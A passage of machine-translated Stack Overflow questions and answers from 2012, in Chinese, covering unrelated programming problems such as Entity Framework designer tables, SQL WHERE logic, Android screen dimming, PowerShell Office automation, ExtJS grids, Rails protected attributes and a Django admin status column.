> 我必须做 rake sunspot:solr:run 这似乎开始时没有错误

听起来 Solr 根本不接受连接，所以这部分是我的第一个怀疑——在启动它时你应该从 Solr 得到很多相当冗长的输出。你能分享一些输出吗？

另外，你运行的是什么版本的java？( `java -version`)

# xna - 如何在 Windows Phone 上做点光源？

> ID：10989491
> 
> 赞同：0
> 
> 时间：2012-06-12T01:23:12.757
> 
> 标签：xna, shader, windows-phone, lighting

我能找到的所有关于使用 XNA 的点光源的东西都使用了自定义着色器，这在 Windows Phone 上是不可用的。可以使用 5 种内置效果中的一种来模拟点光源吗？如何在 Windows Phone 上做点光源？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T09:46:44.877

BasicEffect 允许您指定定向照明，您可以使用其中之一吗？只需在世界空间中设置它的位置并将其指向您渲染的每个模型？

# visual-studio-2010 - 实体数据模型设计器不显示表格

> ID：10989492
> 
> 赞同：11
> 
> 时间：2012-06-12T01:23:15.510
> 
> 标签：visual-studio-2010, entity-framework

我正在尝试通过现有数据库创建实体数据模型，

所以我在 Visual Studio 2010 中按照以下步骤操作：

1.  添加新项目->实体数据模型
2.  选择“从数据库生成”
3.  选择一个连接字符串，测试连接字符串和它的ok
4.  选择要导入的表、存储的过程等，此时没有表显示，但我确实检查了“表”选择——我假设它应该在这里列出我的表。

然后在这些步骤之后，实体数据模型可视化工具（即双击 .edmx 文件）显示没有表 - 我的数据库中有表，并且用于连接的用户名和传递我的权限可以访问这些表。

谢谢。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-08-12T19:27:33.530

在文本编辑器中打开您的 edmx 文件。如果您在文件中看到表但在设计器中没有，请尝试清除所有 EntitySet 节点和 EntityType 节点，保存文件，然后返回 Visual Studio 并再次尝试*从数据库更新模型*。

```
<edmx:StorageModels>
    <Schema Namespace="myModel.Store">
        <EntityContainer Name="MyModelStoreContainer">
            delete-> <EntitySet Name="Table1" ... />
            delete-> <EntitySet Name="Table2" ... />
        </EntityContainer>
            delete-> <EntityType Name="Table1">...</EntityType>
            delete-> <EntityType Name="Table2">...</EntityType>
  </Schema></edmx:StorageModels> 
```

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2013-06-11T18:35:58.663

我也有类似的问题。但就我而言，这是由于所选表中缺少主键。所以，我添加了一个主键，并从数据库中更新了模型。之后，我可以看到表格和所有列！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2019-06-29T17:22:19.343

我有同样的问题，我解决了在 DataConnection 过滤器中添加所有模式的问题，我现在不完全是 wath 表缺少索引或初级键等，但是这样做我解决并显示了所有数据。

# sql-server-2005 - 在 where 子句中使用 IF 逻辑

> ID：10989501
> 
> 赞同：0
> 
> 时间：2012-06-12T01:25:11.883
> 
> 标签：sql-server-2005, if-statement, case-when

好的，在问这个问题之前我已经对这个话题做了很多研究，但是考虑到我的具体情况。目前我的代码如下所示：

```
SELECT RTRIM(logtype)+'-'+RTRIM(servicenbr)+'-'+CONVERT(varchar(25), idserv) as CaseNbr, (CASE WHEN tn.TeamText IS NULL THEN 'HELPDESK' WHEN tn.TeamText like '' THEN 'HELPDESK' ELSE tn.TeamText END) as SourceTeam, (tn2.TeamText) as DestinationTeam
 FROM teamnames as tn2
    LEFT OUTER JOIN caseaudit AS ca
    ON tn2.teamID = ca.referteamID2
    LEFT OUTER JOIN openstatus As os
    ON ca.logno = os.logno
    LEFT OUTER JOIN teamnames as tn
    ON ca.referteamid1 = tn.teamid
 WHERE CONVERT(smalldatetime,ca.dModLast,101) BETWEEN '2012-06-04' AND '2012-06-11'

 --NEED TO PUT IF CLAUSE HERE

 ORDER BY DestinationTeam 
```

具体来说，我的 IF 子句，或者 CASE WHEN，需要测试看看

```
WHERE ca.asggrp1 <> ca.asggrp2 
AND ca.referteamid1 <> ca.referteamid2 AND tn2.isactive = 1 AND tn2.groupid = 18\. 

If they are equal, then the ticket should be ignored UNLESS 
ca.asggrp1 = 'CLIENT' AND ca.asggrp2 = 'CLIENT' 
AND ca.referteamid1 <> ca.referteamid2 AND tn2.isactive = 1 AND tn2.groupid = 18. 
```

***编辑：***

好吧……让我们试试这个。查询应始终拉取具有以下限制的案例：

```
WHERE ca.referteamid1 <> ca.referteamid2 AND tn2.isactive = 1 AND tn2.groupid = 18 
```

另外，我想将结果限制为 when `ca.asggrp1 <> ca.asggrp2`，除非它们都等于 'CLIENT'

***编辑：***

再试一次……我失去了我的听众。这是我能给出的关于我正在尝试做的最好的解释。

```
SELECT RTRIM(logtype)+'-'+RTRIM(servicenbr)+'-'+CONVERT(varchar(25), idserv) as CaseNbr, (CASE WHEN tn.TeamText IS NULL THEN 'HELPDESK' WHEN tn.TeamText like '' THEN 'HELPDESK' ELSE tn.TeamText END) as SourceTeam, (tn2.TeamText) as DestinationTeam
 FROM teamnames as tn2
    LEFT OUTER JOIN caseaudit AS ca
    ON tn2.teamID = ca.referteamID2
    LEFT OUTER JOIN openstatus As os
    ON ca.logno = os.logno
    LEFT OUTER JOIN teamnames as tn
    ON ca.referteamid1 = tn.teamid
 WHERE CONVERT(smalldatetime,ca.dModLast,101) BETWEEN '2012-06-04' AND '2012-06-11'
 AND ca.referteamid1 <> ca.referteamid2 AND tn2.isactive = 1 AND tn2.groupid = 18
----AND (ca.asggrp1 <> ca.asggrp2 UNLESS ca.asggrp1 = 'CLIENT' AND ca.asggrp2 = 'CLIENT')
 ORDER BY DestinationTeam 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T02:03:44.907

我觉得自己像个白痴。我只需要使用一个简单的 OR。

```
AND (ca.asggrp1 <> ca.asggrp2 OR ca.asggrp1 = 'CLIENT' AND ca.asggrp2 = 'CLIENT') 
```

我想我们都会时不时地把事情复杂化。

# android - Facebook apprequest 消息未显示在接收者的通知列表中

> ID：10989503
> 
> 赞同：0
> 
> 时间：2012-06-12T01:25:40.503
> 
> 标签：android, facebook

我正在尝试使用 Android 上的 Facebook 对话框向朋友发送直接消息。执行的代码如下：

```
Bundle params = new Bundle();
    params.putString("message", "sending direct messages");
    params.putString("to", friendId);
    mFacebook.dialog(FBFriendsActivity.this, "apprequests", params, new PostDialogListener()); 
```

代码执行良好。没有错误。Facebook 发送对话框出现，我点击发送。但是，我没有在接收者的通知中看到任何通知。

我必须要有一个 facebook 应用程序才能使用它吗？如果是这样，我如何发送用户到用户的请求？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T20:56:01.940

我会假设三件事之一。

1.  您的应用程序仍处于测试模式
2.  应用请求发送给测试用户而不是普通用户帐户
3.  最重要的是，您的应用可能未正确配置为**画布应用**。

有关更多信息，请参阅[https://developers.facebook.com/docs/reference/dialogs/requests/](https://developers.facebook.com/docs/reference/dialogs/requests/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T02:10:18.720

“直接消息”是什么意思？收件箱消息？我不认为 Facebook Android API 支持这个......

是的，你需要一个 Facebook 应用程序，否则你如何实例化`mFacebook`？假设它是`Facebook mFacebook = new Facebook("YOUR_APP_ID");`。但我认为你确实有你的 Facebook 应用程序，因为你说已经显示了一个对话框并且你点击了发送。

对于您的代码，如果您想将应用请求发送给您的朋友，您会这样做。

您可能需要查看本教程，该教程向您展示了 Facebook 集成的关键步骤。
[https://developers.facebook.com/docs/mobile/android/build/#register](https://developers.facebook.com/docs/mobile/android/build/#register)

# android - Android：以编程方式显示 UNDIM SCREEN

> ID：10989504
> 
> 赞同：0
> 
> 时间：2012-06-12T01:25:45.793
> 
> 标签：android, view

如何以编程方式取消显示？我一天最多可以编译 100 次。而且大多数时候屏幕变暗了，我必须触摸屏幕才能清楚地看到我刚刚做了什么改变。我不需要仅在本地更改系统亮度。我已经尝试了这两种变化都无济于事，我仍然需要触摸屏幕才能使其达到全亮度。现在，如果我在手臂上附加一个 5 磅的重量，也许会有一些好处，而不是一遍又一遍地做同样的事情会带来轻微的刺激。还尝试了注释掉的代码：

```
 WindowManager.LayoutParams layout = getWindow().getAttributes();
    layout.dimAmount=1F;
    //screenBrightness = 1F;
    getWindow().setAttributes(layout);
    setContentView(R.layout.main); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T01:36:37.220

我看到两种方法：

1.最简单的方法是使用[keepScreenOn](http://developer.android.com/reference/android/view/View.html#attr_android:keepScreenOn)属性来防止屏幕变暗。您可以在 XML 中将其设置为 View 属性，但也可以通过编程方式 (setKeepScreenOn)。

例如，以编程方式，您可以将其添加到 Activity 的 onCreate() 方法中：

```
 getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON); 
```

2.如果要处理调暗/亮度，也可以尝试设置*layout.screenBrightness*。如果这种方法不起作用，可能是因为 WindowManager 不知道它（即没有发生刷新）。[这里](https://stackoverflow.com/a/7658364/1099432)有一个公认的 stackoverflow 答案，但我从未测试过。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T03:49:34.317

基于 Thomas Calc 先前的答案，如果您只希望在开发应用程序时保持显示，您可能想尝试

```
if (BuildConfig.DEBUG) {
     getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
} 
```

这只会在您开发应用程序时保持显示，而不是在您导出应用程序以供最终使用时保持显示。

# powershell - 如何使用 PowerShell 隐藏 Office 2010 应用程序？

> ID：10989507
> 
> 赞同：2
> 
> 时间：2012-06-12T01:26:34.200
> 
> 标签：powershell

过去，如果我们想在后台运行office 2003、2007应用程序，我们可以将“Visible”属性的值设置为$False。但是我们不能在 office 2010 中执行相同的操作，如果我将值设置为 $fasle 或“msoFalse”，它会收到错误消息，例如：

============================

异常设置“可见”：“应用程序（未知成员）：无效请求。隐藏应用程序窗口不是

允许。”

在行：1 字符：1

*   $app.Visible="msoFalse"

或者

异常设置“可见”：“无法将值“False”转换为类型“Microsoft.Office.Core.MsoTriState”。错误：

“从 'System.Boolean' 到 'Microsoft.Office.Core.MsoTriState' 的无效转换。”

==============================

如果我将“Visible”的值设置为“msoTrue”，它可以正常工作并且不会发生错误。

有没有人有任何想法会导致这种情况？以及如何使office 2010应用程序在后台运行？

顺便说一句，我对 word 使用相同的操作，excel 2010 不会发生错误，并且效果很好。但仅在 powerpoint 2010 上运行时，我收到了错误消息。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T07:34:34.880

我可以对 office 2010 做同样的事情。例如，显示和隐藏 Word：

```
$word = New-Object -ComObject Word.Application
$word.Visible=$true
$word.Visible=$false 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2017-01-06T18:41:26.557

CB。是正确的，因为您可以使用 MsoTriState，但它的选项在 powershell 绑定中并不那么明显。您可以查看 Open 命令的定义：

```
PS C:\Users\jidar\Documents> $doc.Presentations.Open

OverloadDefinitions
-------------------
Presentation Open (string, MsoTriState, MsoTriState, MsoTriState) 
```

尝试遵循上述定义，我能够使用以下内容：

```
$doc.Presentations.Open($item, [Microsoft.Office.Core.MsoTriState]::msoFalse, [Microsoft.Office.Core.MsoTriState]::msoFalse, [Microsoft.Office.Core.MsoTriState]::msoFalse) 
```

我没有深入研究需要或不需要哪个 msoFalse，因此可能需要进行一些验证。

编辑：忘了提，这是在 Office 2016 上测试过的（其他版本为 YMMV）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-12T04:44:33.660

只需使用[MsoTriState 枚举器](http://msdn.microsoft.com/en-us/library/microsoft.office.core.msotristate.aspx)：

```
$app.visible = [Microsoft.Office.Core.MsoTriState]::msoTrue 
```

或者

```
$app.visible = [Microsoft.Office.Core.MsoTriState]::msoFalse 
```

# c++ - 使用 Flood Fill 时遇到循环

> ID：10989509
> 
> 赞同：0
> 
> 时间：2012-06-12T01:26:41.563
> 
> 标签：c++, infinite-loop, flood-fill

我在运行以下代码时遇到了无限循环。在一个被块包围的网格内，一个预定义的正方形开始于此实现运行。如果需要访问一个正方形，则将其标记为 1，如果已访问，则将其标记为 2。我似乎找不到解决方案，我希望得到一些有用的提示。

```
one_count=1;
while(one_count>0){
    for(int i=0;i<24;i++){
        for(int c=0;c<80;c++){
            if(create[i][c]=='1'){
                if(create[i-1][c]==' '){
                    create[i-1][c]='1';
                }
                if(create[i+1][c]==' '){
                    create[i+1][c]='1';
                }
                if(create[i][c-1]==' '){
                    create[i][c-1]='1';
                }
                if(create[i][c+1]==' '){
                    create[i][c+1]='1';
                }
                create[i][c]='2';
            }
        }
    }
    one_count=0;
    for(int i=0;i<24;i++){
        for(int c=0;c<80;c++){
            if(create[i][c]=='1'){
                one_count++;
            }
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T08:33:54.587

我在随机数据上运行了您的代码（边缘为“X”）。我没有遇到任何循环。

您也没有理由遇到问题。在每次迭代中检查每个像素，并保证所有的“1”都被更改为“2”。没有退路，不可能循环。

也许您可以提供有关程序行为的更多信息。

**顺便说一句**：您的代码中有一个小怪癖。由于您在循环期间已经在编写地图，因此洪水会快速填充到底部和右侧（难以解释 -> 示例）

*   循环开始：一切都是 ' ' 除了 create[2][2]=='1'
*   检查所有元素直到创建[2][2]，将“1”写入邻居，将“2”写入自身
*   检查下一个元素，即创建[2][3]，它也是'1'并填充邻居
*   等等

因此，在第一个周期之后，您只会期望创建 [2][2]=='2'，但它右侧和下方的所有内容也是 =='2'。

目前它不会破坏您的代码，但如果您更改某些内容，它可能会导致意外结果。

# extjs - 我的 javascript 页面是空白的

> ID：10989510
> 
> 赞同：1
> 
> 时间：2012-06-12T01:26:43.090
> 
> 标签：extjs

我编写了这个 Ext js 应用程序，但在第 32 行中不断收到无法调用方法“create”的错误消息。我从原始代码中删除了一些行。Ext.onReady 没有工作，页面只是空白，调试器没有给出任何错误，但是当我拿出 Ext.onReady() 这个错误弹出

```
<html>
  <head><title>Arrar Read</title>

    </head>
  <body>

 <link rel="stylesheet" type="text/css" href="C:/Users/kevin/ext-3.4.0/ext-3.4.0        /resources/css/ext-all.css"/>

 <script type="text/javascript" src="C:/Users/kevin/ext-3.4.0/ext-3.4.0/adapter      /ext/ext-base-debug.js"></script>
 <script type="text/javascript" src="C:/Users/kevin/ext-3.4.0/ext-3.4.0ext-all.js">       </script>
 <script type="text/javascript" src="C:/Users/kevin/ext-3.4.0/ext-3.4.0/ext-all-       debug.js"></script>
<script type="text/javascript" src="C:/Users/kevin/ext-3.4.0/ext-3.4.0/adapter/ext/ext-base.js"></script>
 <script type="text/javascript" src="C:/Users/kevin/ext-3.4.0/ext-3.4.0/pkgs/ext-core.js"></script>

    <script type="text/javascript">

 var arrayD = [
['Jary Garcia', 'MD'],
['Arron, Baker', 'VA'],
['Susan Smith',  'DC'],
['Mary Smith',  'DE'],
['Bryan Shanly',  'NJ'],
['Nyron Selgado',  'CA']
  ];

  var nameRecord = Ext.data.Record.create([
{ name: 'name', mapping : 1},
{ name: 'state',mapping : 2}
 ]);

  var arrayReader = new Ext.data.ArrayReader({},nameRecord); //creating a reader

  var memoryProxy = new Ext.data.MemoryProxy(arrayD); //creating a memory proxy from the array

 var store = new Ext.data.Store({ //create a store
reader : arrayReader,
proxy : memoryProxy

 });

 var colModel = new Ext.grid.ColumnModel([
{
    header : 'Full Name',
    sortable : true,
    dataIndex : 'fullName'
},
{
    header : 'State',
    dataIndex : 'state'
}
  ]);

  var gridView = new Ext.grid.GridView();

  var selModel = new Ext.grid.RowSelectionModel({
singleSelect : true
  });

  var grid = new Ext.grid.GridPanel({ //create a gridpanel
title : 'First Grid',
renderTo : Ext.getBody(),
autoHeight : true,
width : 250,
store : store,
view : gridView,
colModel : colModel,
selModel : selModel
 });

  console.debug('everything executed');

  </script>

  </body>
 </html> 
```

我不知道我是否缺少一些脚本文件。有人可以帮帮我吗

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-10T11:07:13.687

这是一个 ExtJs 4 示例：（工作[小提琴](http://jsfiddle.net/Vandeplas/jKUBM/1/)）

```
var arrayD = [
    ['Jary Garcia', 'MD'],
    ['Arron, Baker', 'VA'],
    ['Susan Smith', 'DC'],
    ['Mary Smith', 'DE'],
    ['Bryan Shanly', 'NJ'],
    ['Nyron Selgado', 'CA']
];

Ext.define('Person', {
    extend: 'Ext.data.Model',
    fields: [
        {name: 'name',  type: 'string'},
        {name: 'state',   type: 'string'}
    ]
});

var store = Ext.create('Ext.data.Store', {
     model: 'Person',
     data: arrayD 
});

var grid = Ext.create('Ext.grid.GridPanel', { //create a gridpanel
    title: 'First Grid',
    renderTo: Ext.getBody(),
    autoHeight: true,
    width: 250,
    store: store,
    columns: [
        {
            header: 'Full Name',
            sortable: true,
            dataIndex: 'name'},
        {
            header: 'State',
            dataIndex: 'state'
        }
    ]
});

console.debug('everything executed');​ 
```

您可以下载自己的版本并将其放入网络服务器或将其中之一用于 js：

```
//for production
<script src="http://cdn.sencha.io/ext-4.1.1-gpl/ext-all.js"></script>
//for debug => isn't minified
<script src="http://cdn.sencha.io/ext-4.1.1-gpl/ext-all-debug.js"></script>
//for development => isn't minified, logs errors and warnings to the console.
<script src="http://cdn.sencha.io/ext-4.1.1-gpl/ext-all-dev.js"></script> 
```

对于 CSS 使用：

```
<link rel="stylesheet" type="text/css" href="htpp://cdn.sencha.io/ext-4.1.1-gpl/resources/css/ext-all.css"/> 
```

# ruby-on-rails - 在 Rails 中分配受保护的属性

> ID：10989513
> 
> 赞同：2
> 
> 时间：2012-06-12T01:27:37.323
> 
> 标签：ruby-on-rails, mass-assignment, attr-accessible, attr-protected

我的用户模型上有一个受保护的字段，因为它决定了许可级别。所以它应该受到保护而不是大量分配。因此，即使属性在 3.2 中默认受到保护，这实际上也是我想要的行为。

但是，在一种控制器方法上，我希望允许经理分配此字段，例如在用户创建或用户更新时。

**如何允许为特定控制器操作分配该属性？**

例如，我有我的控制器：

```
# app/controllers/admin/users_controller.rb

def create
    @user = User.new(params[:user])
# ...
end 
```

现在我要做的是 exclude `clearance`from `params[:user]`，但它似乎在到达该行之前就被过滤掉并引发和异常（我尝试`debugger`在该行之前放置一个权利，甚至将其注释掉，它仍然引发了一个异常）。

**受保护的属性在哪里被捕获，如果不是在调用时`User#new`？**

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-12T01:48:06.780

[Rails](http://guides.rubyonrails.org/security.html#countermeasures)执行此操作的方法是分配没有保护的属性或使用管理员角色：

```
@user = User.new
@user.assign_attributes(params[:user], :without_protection => true)
@user.save 
```

但是，我发现这有点乏味，所以我编写了一个名为[sudo_attributes](https://github.com/beerlington/sudo_attributes)的 gem ，它提供了（在我看来）更好的 API：

```
@user = User.sudo_new(params[:user])
@user.save 
```

它模仿了 Rails 的所有实例化、创建和更新方法（new、build、create、create!、update_attributes 等）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T19:41:23.493

过去，我倾向于为这种操作提供自己包含的方法，它只设置这个值：

```
# app/controllers/admin/users_controller.rb

def full_clearance
  User.find(params[:id]).update_attribute(:clearance, 'full')
end

def restricted_clearance
  User.find(params[:id]).update_attribute(:clearance, 'restricted')
end 
```

现在看看Beerlington 提到[的 Rails 方式](http://guides.rubyonrails.org/security.html#countermeasures)，我宁愿使用角色，让特定的操作访问权限属性：

```
# /app/models/user.rb

attr_accessible :attributes_accessible_by_default, ..., :clearance, :as => :manager

# app/controllers/admin/users_controller.rb

def create
    @user = User.new(params[:user].merge(:as => :manager)
# ...
end 
```

在这种情况下，甚至可以根据用户的角色属性授予访问权限：

```
# app/controllers/admin/users_controller.rb

def create
    @user = User.new(params[:user].merge(:as => current_user.role.to_sym)
# ...
end 
```

但这可能会导致再次引发错误。

# c++ - 嵌套产品的准确求和

> ID：10989521
> 
> 赞同：1
> 
> 时间：2012-06-12T01:28:29.207
> 
> 标签：c++, floating-point, numerical

我想减少以下计算中的数值浮点错误。

我有以下形式的方程：

```
b_3+w_3*(b_2+w_2*(b_1+w_1*(b_0+w_0))) 
```

其中变量`w`表示范围内的某个浮点数`[0,1]`，并`b`表示范围内的浮点常数`[1,~1000000]`。`b`随下标单调增加（尽管这可能并不重要）。当然，这可以扩展到任意数量的术语：

```
b_4+w_4*(c_3+w_3*(b_2+w_2*(b_1+w_1*(b_0+w_0)))) 
```

这可以递归定义为：

```
func(x,n):
   if(n==MAX)
      return x
   else
      return func(b[n]+x*w[n],n+1)

func(1,0) 
```

如果我在进行在线求和，我可以使用 Kahan Summation Algorithm (Kahan 1965)，或其他几种方法之一，如 Higham 1993 或 McNamee 2004，来限制我的错误大小。如果我在做在线重复产品，我可以使用某种转换技术将问题简化为求和。

事实上，我不确定如何解决这个特定问题。有没有人有想法（和引用与他们一起去）？

谢谢！

Higham 1993。“浮点求和的准确性”。SIAM 科学计算杂志。

Kahan 1965。“实践：关于减少截断错误的进一步评论”。CACM。“10.1145/363707.363723”。

McNamee 2004。“准确求和方法的比较”。SIGSAM 公牛。“10.1145/980175.980177”。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-12T03:29:19.580

您的计算看起来类似于霍纳方案，除了不是单个变量 x，而是在每个阶段使用不同的权重 w[i]。

有补偿霍纳方案的算法，我认为您可以根据自己的目的进行调整。例如，请参见以下论文中的定理 3 和算法 2。

P. Langlois，如何使用补偿霍纳算法确保忠实的多项式评估。第 18 届 IEEE 计算机算术研讨会，2007 年 6 月 25 日至 27 日，ARITH '07，第 141-149 页， [http: //www.acsel-lab.com/arithmetic/papers/ARITH18/ARITH18_Langlois.pdf](http://www.acsel-lab.com/arithmetic/papers/ARITH18/ARITH18_Langlois.pdf)

如果在算法 2 中将 TwoProd (s[i+1], x) 替换为 TwoProd (s[i+1], w[i+1]) ，您似乎会得到想要的结果，但我还没有尝试过。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T02:43:37.720

按照您定义的方式`func`，它的计算结果为以下表达式：

```
For MAX = n+1, func(1,0) ==

     n     n
   \---  -----
1 + >     | |  w[j]
   /---   | | 
    i=0  j=n-i 
```

所以，我解决总和的方法是：

```
double s = 0.0;
double a = 1.0;
for (int i = 1; i <= MAX; ++i) {
    a *= w[MAX-i];
    s += a;
}
return 1.0 + s; 
```

即使我们将`x`输入值`func`视为变量，它也只会影响最后一项。但由于它的范围，你应该小心计算它。

```
double s = 0.0;
double a = 1.0;
double ax = x;
for (int i = 1; i < MAX; ++i) {
    a *= w[MAX-i];
    ax *= w[MAX-i];
    s += a;
}
ax *= w[0];
s += ax;
return 1.0 + s; 
```

# file - PhoneGap，文件复制错误：代码 = 1，

> ID：10989523
> 
> 赞同：2
> 
> 时间：2012-06-12T01:28:45.747
> 
> 标签：file, cordova

文件复制错误，详细信息：

2012-06-12 09:21:38.557 mead_debug[10314:fb03] [INFO] parent_entry := /Users/laiqinyi/Library/Application Support/iPhone Simulator/4.3.2/Applications/5EFBD6D1-66EB-4DEC-8AE7-D386729744E9 /Documents/dest/
2012-06-12 09:22:34.640 mead_debug[10314:fb03] [INFO] 上传错误源未定义
2012-06-12 09:22:34.641 mead_debug[10314:fb03] [INFO] 上传错误目标undefined

我遵循 API 指令，并且不认为这个“copyTo”代码有什么问题。
此外，还有文件夹“Documents/dest”和文件“Documents/readme.txt”
[http://docs.phonegap.com/en/1.8.0/cordova_file_file.md.html#File](http://docs.phonegap.com/en/1.8.0/cordova_file_file.md.html#File)

```
**var FileSystem = {
    copy : function(src, dest){
    var parentEntry = new DirectoryEntry({fullPath:("/dest")});
    console.log("parent_entry := " + FileSystem.root_path+"/dest");
    function gotFS(fileSystem) {
        fileSystem.root.getFile("readme.txt", null, gotFileEntry, fail);
    }

    function gotFileEntry(fileEntry) {
        fileEntry.copyTo(parentEntry, "file.copy", function(e){console.log("copy okay");}, fail);
    }
    window.requestFileSystem(LocalFileSystem.PERSISTENT, 0, gotFS, fail);
   }

}** 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-26T08:33:00.353

```
copy : function(fromUrl, toPath, toName){
        console.log("copyFile - From: [" + fromUrl + "] To: " + toPath + " Name: " + toName);
        // Set up some storage
        var destPath = '';
        var destName = '';
        doMoveFile(fromUrl);
        // Called when file needs to be moved / after capture
        function doMoveFile(fileUrl){
            //console.log("doMoveFile - fileUrl: " + JSON.stringify(fileUrl));
            // Remember the source file name just in case it was not passed so reuse it, and for logging
            var destName = fileUrl.name;
            var destPath = fileUrl;
            // Resolve the file system
            window.resolveLocalFileSystemURI(fileUrl,resFSSuccess, resFSError);
            // Called upon successful File System resolution
            function resFSSuccess(entry){
                //console.log("resFSSuccess Success - entry: " + JSON.stringify(entry));
                // Request a file system
                window.requestFileSystem(LocalFileSystem.PERSISTENT, 0,
                                         requestFileSystemSuccess, requestFileSystemError);
                // Called upon successful File System request
                function requestFileSystemSuccess(fileSys){
                    // Get the source directory
                    fileSys.root.getDirectory(toPath, {create: true, exclusive:false}, getDestDirSuccess, getDestDirError);
                    // Called upon successful Get Of Destination Directory
                    function getDestDirSuccess(directory){
                        // Get the destination file name, set it if it is blank or not passed by the App
                        toName = (toName) ? toName : destName;
                        // Remember the full path name for the console log
                        fullDestPath = directory.fullPath + '/' + toName;
                        // Make the move
                        entry.copyTo(directory, toName, moveSuccess, moveError);
                        function moveSuccess(){
                            console.log("Successful copy of " + destPath + " to " + fullDestPath);
                        };
                        function moveError(error){
                            console.log("copyError code: " + JSON.stringify(error));
                        };
                    }
                    // Get Destination Dir Failure
                    function getDestDirError(error){
                        console.log("getDestDirError code: " + JSON.stringify(error));
                    };     
                }
                // File System Request Failure
                function requestFileSystemError(error){
                    console.log("requestFileSystemError code: " + JSON.stringify(error));
                };
            }
            // Note File System failure
            function resFSError(error){
                console.log("resFSError code: " + JSON.stringify(error));
            };
        }
    } 
```

# php - $_SERVER['REQUEST_URI'] 返回额外的 url

> ID：10989525
> 
> 赞同：1
> 
> 时间：2012-06-12T01:28:55.423
> 
> 标签：php, .htaccess

我`$_SERVER['REQUEST_URI']`用来获取当前页面的 URL，然后将其插入 MySQL 数据库。这一切都很好，但它做了一些不应该做的额外事情。

我还使用`.htaccess`文件将服务器错误重定向到自定义 URL。

我遇到的问题是，当我转到我网站上的单个页面时（从网站的另一个页面或通过输入 URL），`$_SERVER['REQUEST_URI']`记录我去的页面以及 404 错误的 URL。

有没有人曾经处理过这个问题或知道如何解决它？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T12:50:02.327

只需将您的 404 行更改为：

```
ErrorDocument 404 /error.php?error=404 
```

因此删除`http://...`之前`error.php`。这将确保将您的 404 URI 转发到`/error.php?error=404`而不是进行外部重定向，因此您的原始 URI 将保留在`$_SERVER['REQUEST_URI']`

# visual-studio-2010 - MFC 网格是绝对布局，在调整窗口大小时会被剪裁

> ID：10989530
> 
> 赞同：0
> 
> 时间：2012-06-12T01:29:46.747
> 
> 标签：visual-studio-2010, visual-c++, mfc

使用 Visual Studio C++ 2010。

目前在 MFC 代码的窗口中，我有一个网格。如果我调整窗口大小（手动拖动角），我希望网格“变小”，但是当我调整窗口大小时，网格实际上是完全静态的，因此例如将窗口大小调整为非常小的尺寸会导致边缘网格成为窗口的可见性之外。

我注意到此窗口中的其他“对象”（特别是我拥有的 MFC 按钮，例如“取消”）确实随窗口缩放，并且在我将窗口调整为较小尺寸时不会消失。它们跟随窗口的边缘，就好像它们被赋予了智能相对坐标而不是我的网格遵循的绝对坐标。

目前我在这里使用网格[http://www.codeproject.com/Articles/8/MFC-Grid-control-2-27](http://www.codeproject.com/Articles/8/MFC-Grid-control-2-27)虽然我高度怀疑这不是问题的根源（有一个示例代码使用它，并且调整大小的行为符合预期；我无法编译它，但我运行了 exe 示例）。我最近从 MSFlexGrid 切换（因为它不支持 64 位），但是在以前的版本中，当我使用 MSFlexGrid 时，它也没有这个问题。

我认为它可能是 .rc 文件中的某种窗口属性或对象属性，但我比较了文件并没有发现任何线索。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T21:01:30.400

没有像窗口属性这样的东西，它告诉窗口将大小调整为父级的大小。

如果按钮改变大小和位置，您可能正在使用某种负责调整子控件大小的类。

对您的网格遵循相同的操作，或通知网格有关父大小的更改并相应地调整网格大小。

# python - 向 Django 管理员添加“状态灯”

> ID：10989532
> 
> 赞同：2
> 
> 时间：2012-06-12T01:30:06.773
> 
> 标签：python, django, django-admin, django-admin-tools

我正在运行一组信息亭，每个信息亭都显示来自我的 Django 应用程序的内容。每个信息亭都会像每分钟一样 ping 一个 url `myurl.com/location=downtown`，看看是否有任何更新。

我的 models.py 看起来像这样。每次 ping 模型时，都会更新 last_updated。

```
class Location(models.Model):
    name = models.CharField(max_length=20)
    last_update = models.DateTimeField() 
```

不幸的是，信息亭中的浏览器每隔一段时间就会崩溃。我要做的是在管理界面的前面添加，在我登录后，一个绿色或红色的小灯表示自其中一个位置更新以来是否已经超过 5 分钟。

这是为应用程序制作心跳的最佳方式吗？如何修改管理界面以显示状态灯以查看信息亭是否正常？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-12T21:37:49.923

糟糕，我在重新阅读问题之前输入了以下内容。因此，如果您想在列表中显示自定义列`Location`，请执行以下操作。否则，请查看@jpic 的答案。

--

是的，您可以使用 ModelAdmin 上的方法定义*自定义管理列，如下所示：*

```
import datetime
from django.contrib import admin
from my_app.models import Location

class LocationAdmin(admin.ModelAdmin):
    list_display = ('name', 'slug', 'custom_column',)

    # define the row x column value here
    def custom_column(self, obj):
        if obj.last_updated < datetime.datetime.now() - datetime.timedelta(minutes=5):
            retval = ('red.jpg', 'This location checked in more than 5 minutes')
        else
            retval = ('green.jpg', 'This location checked in less than 5 minutes ago')
        return "<img src='%s' alt='%s' />" % retval

    # set the column heading here
    custom_column.short_description = 'Status'

# don't forget to register the newly sub-classed ModelAdmin
admin.site.register(Location, LocationAdmin) 
```

